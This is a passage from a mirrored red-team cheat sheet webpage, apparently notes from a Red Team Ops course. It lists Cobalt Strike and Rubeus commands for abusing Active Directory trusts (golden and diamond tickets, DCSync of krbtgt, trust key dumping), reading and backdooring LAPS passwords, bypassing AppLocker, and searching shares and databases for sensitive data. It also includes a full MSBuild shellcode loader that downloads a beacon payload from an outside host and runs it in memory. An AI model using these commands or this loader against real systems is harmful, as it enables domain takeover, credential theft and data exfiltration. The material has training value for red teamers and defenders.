+<h3 class="code-line" data-line-start=1211 data-line-end=1212 ><a id="Forest__Domain_Trusts_1211"></a>Forest &amp; Domain Trusts</h3>
+<pre><code class="has-line-data" data-line-start="1214" data-line-end="1305" class="language-powershell">
+<span class="hljs-comment"># Enumerate the Domain Trust (Use -Domain attribute to enumerate other domains)</span>
+beacon&gt; powerpick Get-DomainTrust
+
+
+
+<span class="hljs-comment">## PrivEsc : Child (DEV.CYBERBOTIC.IO) to Parent (CYBERBOTIC.IO) within Same Domain via SID History</span>
+
+<span class="hljs-comment"># Enumerate basic info required for creating forged ticket</span>
+beacon&gt; powerpick Get-DomainGroup -Identity <span class="hljs-string">"Domain Admins"</span> -Domain cyberbotic.io -Properties ObjectSid
+beacon&gt; powerpick Get-DomainController -Domain cyberbotic.io | select Name
+beacon&gt; powerpick Get-DomainGroupMember -Identity <span class="hljs-string">"Domain Admins"</span> -Domain cyberbotic.io | select MemberName
+
+<span class="hljs-comment"># Use Golden Ticket technique</span>
+PS C:\Users\Attacker&gt; C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /aes256:<span class="hljs-number">51</span>d7f328ade26e9f785fd7eee191265ebc87c01a4790a7f38fb52e06563d4e7e /user:Administrator /domain:dev.cyberbotic.io /sid:S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">569305411</span>-<span class="hljs-number">121244042</span>-<span class="hljs-number">2357301523</span> /sids:S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">2594061375</span>-<span class="hljs-number">675613155</span>-<span class="hljs-number">814674916</span>-<span class="hljs-number">512</span> /nowrap
+
+<span class="hljs-comment"># Or, Use Diamond Ticket technique</span>
+beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:<span class="hljs-number">500</span> /groups:<span class="hljs-number">519</span> /sids:S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">2594061375</span>-<span class="hljs-number">675613155</span>-<span class="hljs-number">814674916</span>-<span class="hljs-number">519</span> /krbkey:<span class="hljs-number">51</span>d7f328ade26e9f785fd7eee191265ebc87c01a4790a7f38fb52e06563d4e7e /nowrap
+
+<span class="hljs-comment"># Inject the ticket</span>
+beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFLz[...snip...]MuaW8=
+
+beacon&gt; steal_token <span class="hljs-number">5060</span>
+beacon&gt; run klist
+beacon&gt; ls \\dc-<span class="hljs-number">1</span>.cyberbotic.io\c$
+beacon&gt; jump psexec64 dc-<span class="hljs-number">1</span>.cyberbotic.io PeerSambhar
+beacon&gt; dcsync cyberbotic.io cyber\krbtgt
+
+
+
+<span class="hljs-comment">## Exploiting Inbound Trusts (Users in our domain can access resources in foreign domain) </span>
+
+<span class="hljs-comment"># We can enumerate the foreign domain with inbound trust</span>
+beacon&gt; powerpick Get-DomainTrust
+beacon&gt; powerpick Get-DomainComputer -Domain dev-studio.com -Properties DnsHostName
+
+<span class="hljs-comment"># Check if members in current domain are part of any group in foreign domain</span>
+beacon&gt; powerpick Get-DomainForeignGroupMember -Domain dev-studio.com
+beacon&gt; powerpick ConvertFrom-SID S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">569305411</span>-<span class="hljs-number">121244042</span>-<span class="hljs-number">2357301523</span>-<span class="hljs-number">1120</span>
+beacon&gt; powerpick Get-DomainGroupMember -Identity <span class="hljs-string">"Studio Admins"</span> | select MemberName
+beacon&gt; powerpick Get-DomainController -Domain dev-studio.com | select Name
+
+<span class="hljs-comment"># Fetch the AES256 hash of nlamb user identfied in previous steps</span>
+beacon&gt; dcsync dev.cyberbotic.io dev\nlamb
+
+<span class="hljs-comment"># We can create Inter-Realm TGT for user identified in above steps (/aes256 has users hash)</span>
+beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:nlamb /domain:dev.cyberbotic.io /aes256:a779fa8afa28d66d155d9d7c14d394359c5d29a86b6417cb94269e2e84c4cee4 /nowrap
+
+beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:krbtgt/dev-studio.com /domain:dev.cyberbotic.io /dc:dc-<span class="hljs-number">2</span>.dev.cyberbotic.io /ticket:doIFwj[...]MuaW8= /nowrap
+
+beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:cifs/dc.dev-studio.com /domain:dev-studio.com /dc:dc.dev-studio.com /ticket:doIFoz[...]NPTQ== /nowrap
+
+<span class="hljs-comment"># Inject the ticket</span>
+beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFLz[...snip...]MuaW8=
+
+beacon&gt; steal_token <span class="hljs-number">5060</span>
+beacon&gt; run klist
+beacon&gt; ls \\dc.dev-studio.com\c$
+
+
+
+<span class="hljs-comment">## Exploiting Outbound Trusts (Users in other domain can access resources in our domain)</span>
+
+<span class="hljs-comment"># Enumerate the outbound trust (msp.com) in parent domain (cyberbotic.io)</span>
+beacon&gt; powerpick Get-DomainTrust -Domain cyberbotic.io
+
+<span class="hljs-comment"># Enumerate the TDO to fetch the shared trust key </span>
+beacon&gt; execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search <span class="hljs-string">"(objectCategory=trustedDomain)"</span> --domain cyberbotic.io --attributes distinguishedName,name,flatName,trustDirection
+
+<span class="hljs-comment"># To be execute on the DC having outbound trust</span>
+beacon&gt; run hostname 
+beacon&gt; mimikatz lsadump::trust /patch
+
+<span class="hljs-comment"># OR, Use DCSync to get the ntlm hash of TDO object remotely</span>
+beacon&gt; powerpick Get-DomainObject -Identity <span class="hljs-string">"CN=msp.org,CN=System,DC=cyberbotic,DC=io"</span> | select objectGuid
+beacon&gt; mimikatz @lsadump::dcsync /domain:cyberbotic.io /guid:{b93d2e36-<span class="hljs-number">48</span>df-<span class="hljs-number">46</span>bf-<span class="hljs-number">89</span>d5-<span class="hljs-number">2</span>fc22c139b43}
+
+<span class="hljs-comment"># There is a "trust account" which gets created in trusted domain (msp.com) by the name of trusting domain (CYBER$), it can be impersonated to gain normal user access (/rc4 is the NTLM hash of TDO Object)</span>
+
+beacon&gt; execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search <span class="hljs-string">"(objectCategory=user)"</span>
+
+beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:CYBER$ /domain:msp.org /rc4:f3fc2312d9d1f80b78e67d55d41ad496 /nowrap
+
+<span class="hljs-comment"># Inject the ticket</span>
+beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:MSP /username:CYBER$ /password:FakePass /ticket:doIFLz[...snip...]MuaW8=
+
+beacon&gt; steal_token <span class="hljs-number">5060</span>
+beacon&gt; run klist
+beacon&gt; powerpick Get-Domain -Domain msp.org
+
+</code></pre>
+<h3 class="code-line" data-line-start=1306 data-line-end=1307 ><a id="LAPS_1306"></a>LAPS</h3>
+<pre><code class="has-line-data" data-line-start="1309" data-line-end="1355" class="language-powershell">
+<span class="hljs-comment"># Check for presence of LAPS </span>
+
+<span class="hljs-comment"># LAPS client installed on local machine</span>
+beacon&gt; ls C:\Program Files\LAPS\CSE
+
+<span class="hljs-comment"># Computer Object having ms-Mcs-AdmPwd and ms-Mcs-AdmPwdExpirationTime attribute set</span>
+powerpick Get-DomainComputer | ? { <span class="hljs-variable">$_</span>.<span class="hljs-string">"ms-Mcs-AdmPwdExpirationTime"</span> <span class="hljs-operator">-ne</span> <span class="hljs-variable">$null</span> } | select dnsHostName
+
+<span class="hljs-comment"># LAPS configuration deplayed through GPO</span>
+beacon&gt; powerpick Get-DomainGPO | ? { <span class="hljs-variable">$_</span>.DisplayName <span class="hljs-operator">-like</span> <span class="hljs-string">"*laps*"</span> } | select DisplayName, Name, GPCFileSysPath | fl
+
+<span class="hljs-comment"># Download LAPS configuration</span>
+beacon&gt; ls \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\{<span class="hljs-number">2</span>BE4337D-D231-<span class="hljs-number">4</span>D23-A029-<span class="hljs-number">7</span>B999885E659}\Machine
+
+beacon&gt; download \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\{<span class="hljs-number">2</span>BE4337D-D231-<span class="hljs-number">4</span>D23-A029-<span class="hljs-number">7</span>B999885E659}\Machine\Registry.pol
+
+<span class="hljs-comment"># Parse the LAPS GPO Policy file downloaded in previous step </span>
+PS C:\Users\Attacker&gt; Parse-PolFile .\Desktop\Registry.pol
+
+<span class="hljs-comment"># Identify the principals who have read right to LAPS password</span>
+
+beacon&gt; powerpick Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? { <span class="hljs-variable">$_</span>.ObjectAceType <span class="hljs-operator">-eq</span> <span class="hljs-string">"ms-Mcs-AdmPwd"</span> -and <span class="hljs-variable">$_</span>.ActiveDirectoryRights <span class="hljs-operator">-match</span> <span class="hljs-string">"ReadProperty"</span> } | select ObjectDn, SecurityIdentifier
+
+beacon&gt; powershell ConvertFrom-SID S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">569305411</span>-<span class="hljs-number">121244042</span>-<span class="hljs-number">2357301523</span>-<span class="hljs-number">1107</span>
+
+<span class="hljs-comment"># Use Laps Toolkit to identify Groups &amp; Users who can read LAPS password</span>
+beacon&gt; powershell-import C:\Tools\LAPSToolkit\LAPSToolkit.ps1
+beacon&gt; powerpick Find-LAPSDelegatedGroups
+beacon&gt; powerpick Find-AdmPwdExtendedRights
+
+<span class="hljs-comment"># View the LAPS password for given machine (From User Session having required rights)</span>
+beacon&gt; powerpick Get-DomainComputer -Identity wkstn-<span class="hljs-number">1</span> -Properties ms-Mcs-AdmPwd
+beacon&gt; powerpick Get-DomainComputer -Identity wkstn-<span class="hljs-number">1</span> -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime
+
+<span class="hljs-comment"># Use the laps password to gain access</span>
+beacon&gt; make_token .\LapsAdmin <span class="hljs-number">1</span>N3FyjJR5L18za
+beacon&gt; ls \\wkstn-<span class="hljs-number">1</span>\c$
+
+<span class="hljs-comment"># Set Far Future date as expiry (Only machine can set its Password)</span>
+beacon&gt; powerpick Set-DomainObject -Identity wkstn-<span class="hljs-number">1</span> -Set @{<span class="hljs-string">'ms-Mcs-AdmPwdExpirationTime'</span> = <span class="hljs-string">'136257686710000000'</span>} -Verbose
+
+<span class="hljs-comment"># LAPS Backdoor</span>
+- Modify the AdmPwd.PS.dll and AdmPwd.Utils.dll file located at C:\Windows\System32\WindowsPowerShell\v1.<span class="hljs-number">0</span>\Modules\AdmPwd.PS\ location to log the LAPS password everytime it is viewed by the admin user
+
+</code></pre>
+<h3 class="code-line" data-line-start=1356 data-line-end=1357 ><a id="AppLocker_1356"></a>AppLocker</h3>
+<pre><code class="has-line-data" data-line-start="1359" data-line-end="1381" class="language-powershell">
+<span class="hljs-comment"># Enumerate the Applocker policy via GPO</span>
+beacon&gt; powershell Get-DomainGPO -Domain dev-studio.com | ? { <span class="hljs-variable">$_</span>.DisplayName <span class="hljs-operator">-like</span> <span class="hljs-string">"*AppLocker*"</span> } | select displayname, gpcfilesyspath
+
+beacon&gt; download \\dev-studio.com\SysVol\dev-studio.com\Policies\{<span class="hljs-number">7</span>E1E1636-<span class="hljs-number">1</span>A59-<span class="hljs-number">4</span>C35-<span class="hljs-number">895</span>B-<span class="hljs-number">3</span>AEB1CA8CFC2}\Machine\Registry.pol
+
+PS C:\Users\Attacker&gt; Parse-PolFile .\Desktop\Registry.pol
+
+<span class="hljs-comment"># Enumerate the Applocker policy via Local Windows registry on machine </span>
+PS C:\Users\Administrator&gt; <span class="hljs-built_in">Get-ChildItem</span> <span class="hljs-string">"HKLM:Software\Policies\Microsoft\Windows\SrpV2"</span>
+
+PS C:\Users\Administrator&gt; <span class="hljs-built_in">Get-ChildItem</span> <span class="hljs-string">"HKLM:Software\Policies\Microsoft\Windows\SrpV2\Exe"</span>
+
+<span class="hljs-comment"># Using powershell on local system</span>
+PS C:\Users\Administrator&gt; <span class="hljs-variable">$ExecutionContext</span>.SessionState.LanguageMode
+ConstrainedLanguage
+
+<span class="hljs-comment"># Navigating Laterally via PSEXEC is fine, as service binary is uploaded in C:\Winodws path which is by default whitelisted</span>
+
+<span class="hljs-comment"># Find the writable path within C:\winodws to bypass Applocker</span>
+beacon&gt; powershell <span class="hljs-built_in">Get-Acl</span> C:\Windows\Tasks | fl
+</code></pre>
+<pre><code class="has-line-data" data-line-start="1383" data-line-end="1457" class="language-C#"># LOLBAS
+# Use MSBuild to execute C# code from a .csproj or .xml file
+# Host http_x64.xprocess.bin via Site Management &gt; Host File
+# Start execution using C:\Windows\Microsoft.Net\Framework64\v4.0.30319\MSBuild.exe test.csproj
+
+&lt;Project ToolsVersion=&quot;4.0&quot; xmlns=&quot;http://schemas.microsoft.com/developer/msbuild/2003&quot;&gt;
+  &lt;Target Name=&quot;MSBuild&quot;&gt;
+   &lt;MSBuildTest/&gt;
+  &lt;/Target&gt;
+   &lt;UsingTask
+    TaskName=&quot;MSBuildTest&quot;
+    TaskFactory=&quot;CodeTaskFactory&quot;
+    AssemblyFile=&quot;C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll&quot; &gt;
+     &lt;Task&gt;
+      &lt;Code Type=&quot;Class&quot; Language=&quot;cs&quot;&gt;
+        &lt;![CDATA[
+
+            using System;
+            using System.Net;
+            using System.Runtime.InteropServices;
+            using Microsoft.Build.Framework;
+            using Microsoft.Build.Utilities;
+
+            public class MSBuildTest :  Task, ITask
+            {
+                public override bool Execute()
+                {
+                    byte[] shellcode;
+                    using (var client = new WebClient())
+                    {
+                        client.BaseAddress = &quot;http://nickelviper.com&quot;;
+                        shellcode = client.DownloadData(&quot;beacon.bin&quot;);
+                    }
+      
+                    var hKernel = LoadLibrary(&quot;kernel32.dll&quot;);
+                    var hVa = GetProcAddress(hKernel, &quot;VirtualAlloc&quot;);
+                    var hCt = GetProcAddress(hKernel, &quot;CreateThread&quot;);
+
+                    var va = Marshal.GetDelegateForFunctionPointer&lt;AllocateVirtualMemory&gt;(hVa);
+                    var ct = Marshal.GetDelegateForFunctionPointer&lt;CreateThread&gt;(hCt);
+
+                    var hMemory = va(IntPtr.Zero, (uint)shellcode.Length, 0x00001000 | 0x00002000, 0x40);
+                    Marshal.Copy(shellcode, 0, hMemory, shellcode.Length);
+
+                    var t = ct(IntPtr.Zero, 0, hMemory, IntPtr.Zero, 0, IntPtr.Zero);
+                    WaitForSingleObject(t, 0xFFFFFFFF);
+
+                    return true;
+                }
+
+            [DllImport(&quot;kernel32&quot;, CharSet = CharSet.Ansi)]
+            private static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)]string lpFileName);
+    
+            [DllImport(&quot;kernel32&quot;, CharSet = CharSet.Ansi)]
+            private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
+            [DllImport(&quot;kernel32&quot;)]
+            private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
+
+            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+            private delegate IntPtr AllocateVirtualMemory(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+    
+            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+            private delegate IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+            }
+
+        ]]&gt;
+      &lt;/Code&gt;
+    &lt;/Task&gt;
+  &lt;/UsingTask&gt;
+&lt;/Project&gt;
+
+</code></pre>
+<pre><code class="has-line-data" data-line-start="1459" data-line-end="1471" class="language-powershell">
+<span class="hljs-comment"># break out of PowerShell Constrained Language Mode by using an unmanaged PowerShell runspace</span>
+beacon&gt; powershell <span class="hljs-variable">$ExecutionContext</span>.SessionState.LanguageMode
+ConstrainedLanguage
+
+beacon&gt; powerpick <span class="hljs-variable">$ExecutionContext</span>.SessionState.LanguageMode
+FullLanguage
+
+<span class="hljs-comment"># Beacon DLL (DLLs are usually not restricted by Applocker due to performance reason)</span>
+C:\Windows\System32\rundll32.exe http_x64.dll,StartW
+
+</code></pre>
+<h3 class="code-line" data-line-start=1473 data-line-end=1474 ><a id="Data_Exfiltration_1473"></a>Data Exfiltration</h3>
+<pre><code class="has-line-data" data-line-start="1476" data-line-end="1499" class="language-powershell">
+<span class="hljs-comment"># Enumerate Share</span>
+beacon&gt; powerpick Invoke-ShareFinder
+beacon&gt; powerpick Invoke-FileFinder
+beacon&gt; powerpick Get-FileNetServer
+beacon&gt; shell findstr /S /I cpassword \\dc.organicsecurity.local\sysvol\organicsecurity.local\policies\*.xml
+beacon&gt; Get-DecryptedCpassword
+
+<span class="hljs-comment"># Find accessible share having juicy information</span>
+beacon&gt; powerpick Find-DomainShare -CheckShareAccess
+beacon&gt; powerpick Find-InterestingDomainShareFile -Include *.doc*, *.xls*, *.csv, *.ppt*
+beacon&gt; powerpick gc \\fs.dev.cyberbotic.io\finance$\export.csv | select -first <span class="hljs-number">5</span>
+
+<span class="hljs-comment"># Search for senstive data in directly accessible DB by keywords</span>
+beacon&gt; powerpick Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { <span class="hljs-variable">$_</span>.Status <span class="hljs-operator">-eq</span> <span class="hljs-string">"Accessible"</span> } | Get-SQLColumnSampleDataThreaded -Keywords <span class="hljs-string">"email,address,credit,card"</span> -SampleSize <span class="hljs-number">5</span> | select instance, database, column, sample | ft -autosize
+
+<span class="hljs-comment"># Search for senstive data in DB links</span>
+beacon&gt; powerpick Get-SQLQuery -Instance <span class="hljs-string">"sql-2.dev.cyberbotic.io,1433"</span> -Query <span class="hljs-string">"select * from openquery("</span><span class="hljs-string">"sql-1.cyberbotic.io"</span><span class="hljs-string">", 'select * from information_schema.tables')"</span>
+
+beacon&gt; powerpick Get-SQLQuery -Instance <span class="hljs-string">"sql-2.dev.cyberbotic.io,1433"</span> -Query <span class="hljs-string">"select * from openquery("</span><span class="hljs-string">"sql-1.cyberbotic.io"</span><span class="hljs-string">", 'select column_name from master.information_schema.columns where table_name=''employees''')"</span>
+
+beacon&gt; powerpick Get-SQLQuery -Instance <span class="hljs-string">"sql-2.dev.cyberbotic.io,1433"</span> -Query <span class="hljs-string">"select * from openquery("</span><span class="hljs-string">"sql-1.cyberbotic.io"</span><span class="hljs-string">", 'select top 5 first_name,gender,sort_code from master.dbo.employees')"</span>
+</code></pre>
+<pre><code class="has-line-data" data-line-start="1502" data-line-end="1509"># Not able to migrate to another process using Inject Command (worked by choosing P2P beacon)
+
+# Was facing some issues with doing the lateral movement by SYSTEM User
+- But if we have access to NTLM hash, we can directly use PTH and JUMP to move laterally 
+- Still Powerview functions don't work in this context, need to find a way
+
+</code></pre>
+<h2 class="code-line" data-line-start=1510 data-line-end=1511 ><a id="Reference_1510"></a>Reference:</h2>
+<p class="has-line-data" data-line-start="1512" data-line-end="1513"><a href="https://training.zeropointsecurity.co.uk/courses/red-team-ops">https://training.zeropointsecurity.co.uk/courses/red-team-ops</a></p>
+
+<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script></body></html>
+<a href="#" class="back-to-top d-flex align-items-center justify-content-center"><i
+      class="bi bi-arrow-up-short"></i></a>
+
+  <!-- Vendor JS Files -->
+  <script src="vendor/purecounter/purecounter.js"></script>
+  <script src="vendor/aos/aos.js"></script>
+  <script src="vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
+  <script src="vendor/glightbox/js/glightbox.min.js"></script>
+  <script src="vendor/isotope-layout/isotope.pkgd.min.js"></script>
+  <script src="vendor/swiper/swiper-bundle.min.js"></script>
+  <script src="vendor/typed.js/typed.min.js"></script>
+  <script src="vendor/waypoints/noframework.waypoints.js"></script>
+  <script src="vendor/php-email-form/validate.js"></script>
+
+  <!-- Prism JS -->
+  <script src="../cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/prism.min.js"></script>
+  <script src="../cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/components/prism-bash.min.js"></script>
+  <script src="../cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/components/prism-powershell.min.js"></script>
+
+  <!-- Template Main JS File -->
+  <script src="js/main.js"></script>
+
+  <!-- Prism JS Additional Keywords-->
+  <script>
+    Prism.languages.bash = Prism.languages.extend('bash', {
+      'function': /\b(?:aircrack-ng|amap|arpspoof|beef|bettercap|bloodhound|burpsuite|ldapsearch|cain|crackmapexec|cewl|curl|cd|dirb|dnsenum|dnsspoof|dnstracer|enum4linux|ettercap|echo|xfreerdp|rdesktop|chmod|mv|sudo|ssh|find|etterfilter|exploitdb|ftp|gobuster|hashcat|hashid|hash-identifier|hydra|httrack|smbmap|impacket-GetNPUsers|impacket-GetTGT|impacket-psexec|impacket-secretsdump|impacket-smbexec|ike-scan|john|kerbrute|linenum|linpeas|ls|maltego|masscan|medusa|metasploit|mimikatz|ms08-067|msfcli|msfconsole|msfupdate|msfvenom|nbtscan|nc|netcat|netdiscover|netstat|nikto|nmap|nslookup|openssh|patator|ping|powershell-empire|powersploit|proxychains|psexec|python|python2|python2.7|python3|reaver|responder|scp|searchsploit|setoolkit|shellshock|smtp-user-enum|smbclient|snmp-check|snmpwalk|sparta|sqlmap|sqlninja|sslscan|sublist3r|tcpdump|telnet|whois|theHarvester|tmux|tshark|ticketer|unicornscan|veil|volatility|wfuzz|whatweb|wireshark|windows-exploit-suggester|w3af|xsser|xsstrike|rpcclient|zaproxy)\b/
+    });
+  </script>
+  <script>
+    Prism.languages.powershell = Prism.languages.extend('powershell', {
+      'function': /\b(?:Add-ADGroupMember|Add-Computer|Add-Content|Add-ExchangeAdministrator|Add-Member|Add-Type|Checkpoint-Computer|Clear-Content|Clear-History|Clear-Item|Clear-ItemProperty|Clear-Variable|Compare-Object|ConvertFrom-Json|ConvertTo-Json|Copy-Item|Copy-ItemProperty|Disable-ADAccount|Disable-PSRemoting|Enable-ADAccount|Enable-PSRemoting|Export-Csv|Export-ModuleMember|Export-PSSession|Find-Module|Get-ADComputer|Get-ADDomain|Get-ADGroup|Get-ADUser|Get-Alias|Get-AuthenticodeSignature|Get-ChildItem|Get-Clipboard|Get-Command|Get-Content|Get-Credential|Get-Date|Get-EventLog|Get-Help|Get-History|Get-Item|Get-ItemProperty|Get-LocalGroupMember|Get-Location|Get-Member|Get-Module|Get-Process|Get-Service|Get-Variable|Get-WinEvent|Import-Csv|Import-Module|Invoke-Command|Invoke-Expression|Invoke-RestMethod|Invoke-WebRequest|Measure-Object|Move-Item|New-ADUser|New-Alias|New-Item|New-Module|New-PSDrive|New-PSSession|Out-File|Read-Host|Remove-ADUser|Remove-Item|Remove-Module|Remove-PSDrive|Remove-Variable|Restart-Computer|Restore-Computer|Select-Object|Set-ADUser|Set-Alias|Set-Content|Set-Date|Set-Item|Set-Location|Set-Variable|Start-Process|Stop-Process|Test-Connection|Test-Path|Update-Help|Write-Host|Write-Output)\b/
+    });
+  </script>
+
+  <script>
+    let allOpen = false; // Track the state of the dropdowns
+
+    function toggleIndex() {
+      const index = document.getElementById('index');
+      index.classList.toggle('open');
+    }
+
+    function toggleAll() {
+      const dropdownContainers = document.querySelectorAll('.dropdown-container, .nested-dropdown-container');
+      const buttons = document.querySelectorAll('.dropdown-btn, .nested-dropdown-btn');
+
+      // Set the new state based on the current state
+      allOpen = !allOpen;
+
+      for (let i = 0; i < dropdownContainers.length; i++) {
+        const container = dropdownContainers[i];
+        const btn = buttons[i];
+        if (allOpen) {
+          container.style.display = 'block';
+          btn.classList.add('active');
+        } else {
+          container.style.display = 'none';
+          btn.classList.remove('active');
+        }
+      }
+    }
+
+    const dropdownBtns = document.getElementsByClassName("dropdown-btn");
+    for (let i = 0; i < dropdownBtns.length; i++) {
+      dropdownBtns[i].addEventListener("click", function () {
+        this.classList.toggle("active");
+        const dropdownContent = this.nextElementSibling;
+        if (dropdownContent.style.display === "block") {
+          dropdownContent.style.display = "none";
+        } else {
+          dropdownContent.style.display = "block";
+        }
+      });
+    }
+
+    const nestedDropdownBtns = document.getElementsByClassName("nested-dropdown-btn");
+    for (let i = 0; i < nestedDropdownBtns.length; i++) {
+      nestedDropdownBtns[i].addEventListener("click", function () {
+        this.classList.toggle("active");
+        const nestedDropdownContent = this.nextElementSibling;
+        if (nestedDropdownContent.style.display === "block") {
+          nestedDropdownContent.style.display = "none";
+        } else {
+          nestedDropdownContent.style.display = "block";
+        }
+      });
+    }
+
+    setTimeout(function () {
+      var alert = document.querySelector('.alert-warning');
+      if (alert) {
+        var bootstrapAlert = new bootstrap.Alert(alert);
+        bootstrapAlert.close();
+      }
+    }, 7000); // 7 seconds
+
+    function removeHighlights(element) {
+      element.innerHTML = element.innerHTML.replace(/<\/?strong>/gi, "");
+    }
+
+    function highlightTerm(element, term) {
+      const regex = new RegExp(`(${term})`, 'gi');
+      element.innerHTML = element.innerHTML.replace(regex, "<strong>$1</strong>");
+    }
+
+    document.getElementById("search-input").addEventListener("input", function () {
+      const searchTerm = this.value.toLowerCase();
+      const headings = document.querySelectorAll(".cheatsheet-content h2, .cheatsheet-content h3, .cheatsheet-content h4, .cheatsheet-content h5, .cheatsheet-content h6");
+      let anyMatch = false;
+
+      headings.forEach((heading) => {
+        const text = heading.textContent.toLowerCase();
+        const sectionContent = [];
+
+        // Get all sibling elements until the next heading
+        let sibling = heading.nextElementSibling;
+        while (sibling && !sibling.matches("h2, h3, h4, h5, h6")) {
+          sectionContent.push(sibling);
+          sibling = sibling.nextElementSibling;
+        }
+
+        // Remove existing highlights
+        removeHighlights(heading);
+
+        // Only show headings and content that match the search term
+        if (text.includes(searchTerm)) {
+          heading.style.display = "";
+          sectionContent.forEach((elem) => (elem.style.display = ""));
+          if (searchTerm) {
+            highlightTerm(heading, searchTerm);
+          }
+
+          anyMatch = true;
+        } else {
+          // Hide non-matching headings and content
+          heading.style.display = "none";
+          sectionContent.forEach((elem) => (elem.style.display = "none"));
+        }
+      });
+
+      const noMatchMessage = document.getElementById("no-match-message");
+      if (!anyMatch) {
+        if (!noMatchMessage) {
+          const message = document.createElement("p");
+          message.id = "no-match-message";
+          message.className = "text-danger mt-3";
+          message.textContent = "No matches found.";
+          document.querySelector(".cheatsheet-content").appendChild(message);
+        }
+      } else if (noMatchMessage) {
+        noMatchMessage.remove();
+      }
+    });
+
+    function toggleSubmenu(event) {
+      event.preventDefault(); // Prevents navigation
+      const submenu = event.currentTarget.nextElementSibling;
+      const arrow = event.currentTarget.querySelector('.arrow');
+
+      submenu.classList.toggle('open'); // Toggle the submenu visibility
+      // Rotate the arrow based on whether the submenu is open
+      if (submenu.classList.contains('open')) {
+        arrow.style.transform = 'rotate(0deg)'; // Arrow points right when closed
+      } else {
+        arrow.style.transform = 'rotate(-90deg)';  // Arrow points down when open
+      }
+    }
+  </script>
+
+</body>
+
+
+<!-- Mirrored from www.emmanuelsolis.com/red_teaming.html by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 02 Aug 2025 18:44:32 GMT -->
+</html>
